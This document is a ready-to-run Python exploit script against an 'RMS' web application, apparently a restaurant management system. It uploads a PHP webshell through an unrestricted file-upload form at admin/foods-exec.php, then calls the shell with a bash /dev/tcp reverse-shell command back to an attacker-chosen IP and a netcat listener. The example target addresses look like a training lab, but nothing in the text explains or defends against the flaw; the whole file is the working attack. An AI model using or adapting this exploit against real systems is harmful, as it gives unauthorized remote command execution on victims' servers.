#!/usr/bin/python3

import requests
import sys
import time

req_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "327",
    "Content-Type": "multipart/form-data; boundary=---------------------------abc123",
    "Connection": "close",
	"Upgrade-Insecure-Requests": "1"

}

POST_data = """
-----------------------------abc123
Content-Disposition: form-data; name="photo"; filename="webshell.php"
Content-Type: text/html

<?php system($_GET["cmd"]); ?>

-----------------------------abc123
Content-Disposition: form-data; name="Submit"

Add
-----------------------------abc123--
"""

def main():
    # Taking the IP address, port number and location of RMS instance from the user:

    if len(sys.argv) != 6:
        print("Usage  : python3 rms-rce.py target_IP target_port target_uri local_ip netcat_port")
        print("Example: python3 rms-rce.py 10.10.134.254 80 /rms/ 10.8.17.244 9999")
        sys.exit(1)
    
    target_IP = sys.argv[1]
    target_Port = sys.argv[2]
    target_URI = sys.argv[3]
    local_IP = sys.argv[4]
    local_port = sys.argv[5]

    url = f'http://{target_IP}:{target_Port}/{target_URI}/admin/foods-exec.php'
    print('')
    print(f'[*] Start a netcat listener by running the command: nc -nlvp {local_port}')
    print('[*] Waiting for 3 seconds before starting the exploit ...')
    time.sleep(3)
    print('')

    try: 
        # Upload the PHP script:
        print('[*] Uploading the webshell ...')
        response = requests.post(url, headers=req_headers, data=POST_data, allow_redirects=False)

      # Checking if the webshell has been uploaded
        if 'has been uploaded' in response.text:
            print('[+] The webshell has been uploaded successfully !!')
            print('[*] Running the reverse shell ...')
            try:
              # Triggering the reverse shell
                resp = requests.get(f"http://{target_IP}:{target_Port}/{target_URI}/images/webshell.php?cmd=bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F{local_IP}%2F{local_port}%200%3E%261", timeout=3)
            except requests.exceptions.Timeout:
              # If the request timedout, it means that the reverse shell was successfull
                print('[*] Check your netcat listener !!')
    except KeyboardInterrupt:
      print('[*] Quitting ...')
      sys.exit(0)
    except Exception as e:
      print(f'Error: {e}')

if __name__ == '__main__':
    main()
